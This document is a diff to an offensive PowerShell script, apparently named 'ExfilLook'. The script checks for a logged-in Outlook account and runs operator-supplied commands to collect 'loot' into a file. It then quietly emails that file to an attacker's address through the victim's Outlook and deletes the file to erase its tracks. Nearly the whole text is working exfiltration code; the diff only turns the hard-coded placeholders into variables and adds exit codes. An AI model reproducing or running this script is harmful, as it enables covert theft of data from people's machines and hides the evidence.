@@ -9,7 +9,24 @@ __         __   ____   _        ___      __     ____     ______      _____      
 "@
 
 # ---------------------------------------------------------------------------------- #
-# Step 1: Test to see if the required processes are enabled on the machine           #
+# Step 1: Manually fill out the required information (OPTIONAL)                      #
+# ---------------------------------------------------------------------------------- #
+
+# The email to send the loot to
+$listenerEmail = ""
+
+$emailSubject = "ExfilLook"
+$emailBody = "Proof of Concept"
+
+# The full path for the file that'll contain the loot
+$filePath = "./loot234289763972623.txt" 
+
+# The commands to fetch the desired information
+$commands = ""
+
+
+# ---------------------------------------------------------------------------------- #
+# Step 2: Test to see if the required processes are enabled on the machine           #
 # ---------------------------------------------------------------------------------- #
 
 # Check for Internet connectivity
@@ -23,16 +40,16 @@ if (Test-Connection -ComputerName 8.8.8.8 -Count 4 -Quiet) {
         #Microsoft Outlook is enabled on this system.
     } else {
         #ERROR: Microsoft Outlook is not enabled on this system. 
-        exit
+        exit 1
     }
 
 } else {
     #ERROR: Machine isn't connected to the Internet.
-    exit
+    exit 1
 }
 
 # ---------------------------------------------------------------------------------- #
-# Step 2: Check if an account is logged in on Outlook                                #          
+# Step 3: Check if an account is logged in on Outlook                                #          
 # ---------------------------------------------------------------------------------- # 
 
 # Create an Outlook application object
@@ -46,33 +63,32 @@ if ($outlook.Session.Accounts.Count -gt 0) {
     }
 } else {
     Write-Host "No accounts are currently logged in to Outlook."
+    exit 1
 }
 
 # Release the Outlook COM object
 #[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null
 
 # ---------------------------------------------------------------------------------- #
-# Step 3: Enumerate the target data and redirect it to a text file                   #
+# Step 4: Enumerate the target data and redirect it to a text file                   #
 # ---------------------------------------------------------------------------------- #
-
-# Define the file path and name
-$filePath = "PATH\FILENAME.txt" # FILL OUT
 
 # Create a new text file
 New-Item -ItemType File -Path $filePath -Force
 
-Write-Output "ENTER COMMANDS IN THIS BLOCK !" > "PATH\FILENAME.txt" # FILL OUT
+# Execute commands and redirect output to new text file
+$commands > $filePath # FILL OUT
 
 # ---------------------------------------------------------------------------------- #
-# Step 4: Exfiltrate the text file containing the loot using Outlook                 #
+# Step 5: Exfiltrate the text file containing the loot using Outlook                 #
 # ---------------------------------------------------------------------------------- #
 
-$ATTACHMENT = "PATH\FILENAME.txt"
+$ATTACHMENT = $filePath
 $outlook = New-Object -comobject outlook.application
 $email = $outlook.CreateItem(0)
-$email.To = "EMAIL" # FILL OUT
-$email.Subject = "ExfilLook" # CHANGE (Optional)
-$email.Body = "Proof of Concept" # CHANGE (Optional)
+$email.To = $listenerEmail 
+$email.Subject = $emailSubject
+$email.Body = $emailBody
 $email.Attachments.add($ATTACHMENT) | Out-Null
 $email.Send()
 $outlook.Quit()
@@ -81,5 +97,5 @@ $outlook.Quit()
 # Step 5: Erase our tracks from the target machine                                   #
 # ---------------------------------------------------------------------------------- #
 
-del $HOME/FILENAME.txt
-exit
+del $filePath
+exit 0
